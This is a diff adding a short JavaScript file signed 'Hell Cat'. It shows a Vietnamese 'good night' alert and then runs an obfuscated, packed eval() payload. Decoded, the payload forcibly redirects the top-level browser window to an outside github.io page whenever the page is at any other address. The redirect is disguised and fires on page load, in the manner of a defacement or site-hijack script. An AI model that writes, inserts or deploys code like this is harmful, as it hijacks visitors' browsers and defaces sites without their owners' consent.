@@ -1,0 +1,3 @@
+/*Hell Cat Hello File*/
+alert("Chúc Các Bạn Ngủ Ngon");
+eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(0.1.9!="2://3.4.5/6/7/"){0.1="2://3.4.5/6/7/"}',10,10,'top|location|https|hellcatvn|github|io|HTMLIndex|ngungon|if|href'.split('|'),0,{}))
